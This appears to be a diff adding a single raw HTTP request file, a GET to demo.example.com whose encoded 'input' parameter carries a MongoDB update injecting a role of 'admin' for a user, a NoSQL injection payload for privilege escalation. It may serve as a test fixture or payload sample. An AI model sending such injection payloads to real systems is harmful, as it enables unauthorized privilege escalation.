@@ -1,0 +1,4 @@
+GET /a?input=db.users.update({%26quot;u%26quot;:%26quot;x%26quot;},{$set:{%26quot;role%26quot;:%26quot;admin%26quot;}}) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
